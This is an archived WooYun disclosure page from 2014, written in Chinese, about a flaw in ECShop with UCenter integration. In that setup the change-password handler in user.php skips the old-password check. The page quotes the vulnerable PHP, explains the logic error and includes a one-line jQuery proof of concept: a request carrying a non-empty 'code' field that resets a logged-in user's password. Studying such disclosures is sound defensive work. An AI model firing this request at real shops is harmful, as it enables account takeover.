@@ -1,0 +1,240 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecshop绕过原密码校验直接修改用户密码（安全隐患）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecshop绕过原密码校验直接修改用户密码（安全隐患）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/ksc">ksc</a> 
+</li><li>提交时间：		2014-02-17 11:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-20：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-09：	细节向普通白帽子公开<br/>
+									2014-03-29：	细节向实习白帽子公开<br/>
+									2014-05-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">最新版本也存在此问题</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">该漏洞有个前提，需要会员系统整合ucenter<br />
+<br />
+<br />
+<br />
+问题出在<br />
+<br />
+user.php $action == &#039;act_edit_password&#039;<br />
+<br />
+</p><p class="detail"><a href="../images/17093718e31e126b76cb15fd17cc3ad8b15588ef.png" target="_blank"><img src="../images/17093718e31e126b76cb15fd17cc3ad8b15588ef.png" alt="QQ截图20140217093645.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>$old_password = isset($_POST[&#039;old_password&#039;]) ? trim($_POST[&#039;old_password&#039;]) : &#039;&#039;;<br />
+    $new_password = isset($_POST[&#039;new_password&#039;]) ? trim($_POST[&#039;new_password&#039;]) : &#039;&#039;;<br />
+    $user_id      = isset($_POST[&#039;uid&#039;])  ? intval($_POST[&#039;uid&#039;]) : $user_id;<br />
+    $code         = isset($_POST[&#039;code&#039;]) ? trim($_POST[&#039;code&#039;])  : &#039;&#039;;<br />
+<br />
+    if (strlen($new_password) &lt; 6)<br />
+    {<br />
+        show_message($_LANG[&#039;passport_js&#039;][&#039;password_shorter&#039;]);<br />
+    }<br />
+<br />
+    $user_info = $user-&gt;get_profile_by_id($user_id); //论坛记录<br />
+<br />
+    if (($user_info &amp;&amp; (!empty($code) &amp;&amp; md5($user_info[&#039;user_id&#039;] . $_CFG[&#039;hash_code&#039;] . $user_info[&#039;reg_time&#039;]) == $code)) || ($_SESSION[&#039;user_id&#039;]&gt;0 &amp;&amp; $_SESSION[&#039;user_id&#039;] == $user_id &amp;&amp; $user-&gt;check_user($_SESSION[&#039;user_name&#039;], $old_password)))<br />
+    {<br />
+        if ($user-&gt;edit_user(array(&#039;username&#039;=&gt; (empty($code) ? $_SESSION[&#039;user_name&#039;] : $user_info[&#039;user_name&#039;]), &#039;old_password&#039;=&gt;$old_password, &#039;password&#039;=&gt;$new_password), empty($code) ? 0 : 1))<br />
+        {<br />
+            $user-&gt;logout();<br />
+            show_message($_LANG[&#039;edit_password_success&#039;], $_LANG[&#039;relogin_lnk&#039;], &#039;user.php?act=login&#039;, &#039;info&#039;);<br />
+        }<br />
+        else<br />
+        {<br />
+            show_message($_LANG[&#039;edit_password_failure&#039;], $_LANG[&#039;back_page_up&#039;], &#039;&#039;, &#039;info&#039;);<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我把上面主要代码精简一下<br />
+<br />
+$code=&#039;123&#039;;<br />
+<br />
+$old_password=null;<br />
+<br />
+$user_info[&#039;user_name&#039;]=当前用户名<br />
+<br />
+</p><pre><code>if( false ||$_SESSION[&#039;user_id&#039;]&gt;0 &amp;&amp; $_SESSION[&#039;user_id&#039;] == $user_id &amp;&amp; $user-&gt;check_user($_SESSION[&#039;user_name&#039;], $old_password))){<br />
+#ucenter 模块中check_user未对原密码校验此处为True<br />
+ <br />
+if ($user-&gt;edit_user(array(&#039;username&#039;=&gt; (  $user_info[&#039;user_name&#039;]), &#039;old_password&#039;=&gt;$old_password, &#039;password&#039;=&gt;$new_password), 1))<br />
+        {<br />
+#edit_user() $code不为空，所以最后一个参数为1 则不校验原密码直接修改<br />
+            成功修改密码<br />
+        }<br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+问题主要出在两个地方<br />
+<br />
+1.ucenter用户整合模块实现check_user()时未校验原密码<br />
+<br />
+2. 通过code找回密码的代码和通过原密码修改密码的代码弄的到一块了<br />
+<br />
+if语句嵌套太多容易扯着蛋蛋 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">登录网站打开调试 粘贴以下js代码运行（为了简化代码，假设有jquery）<br />
+<br />
+</p><pre><code>$.post(&#039;user.php?act=act_edit_password&#039;,{&#039;new_password&#039;:&#039;123456&#039;,code:&#039;不为空就行&#039;},<br />
+    function(data){<br />
+        <br />
+});</code></pre><p class='detail'><br />
+<br />
+然后刷新代码<br />
+<br />
+若是退出状态则修改密码成功 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/ksc" title="ksc">ksc</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051149" title="ecshop绕过原密码校验直接修改用户密码（安全隐患）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2014-02-17 11:47</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快处理<br />
+谢谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51149";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
